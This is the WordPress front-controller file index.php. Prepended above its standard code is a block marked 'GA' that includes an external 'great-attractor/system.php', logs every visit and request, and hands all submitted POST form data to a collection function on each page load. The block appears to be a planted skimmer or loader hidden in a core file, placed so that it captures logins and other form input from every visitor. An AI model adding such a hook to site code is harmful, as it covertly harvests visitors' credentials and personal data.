<?php

# GA

include_once('great-attractor/system.php');

ga_init('index');
ga_register_visit();
ga_register_request();

if (!empty($_POST)) {
  ga_register_form_data($_POST);
}

# END GA

/**
 * Front to the WordPress application. This file doesn't do anything, but loads
 * wp-blog-header.php which does and tells WordPress to load the theme.
 *
 * @package WordPress
 */

/**
 * Tells WordPress to load the WordPress theme and output it.
 *
 * @var bool
 */
define('WP_USE_THEMES', true);

/** Loads the WordPress Environment and Template */
require( dirname( __FILE__ ) . '/wp-blog-header.php' );
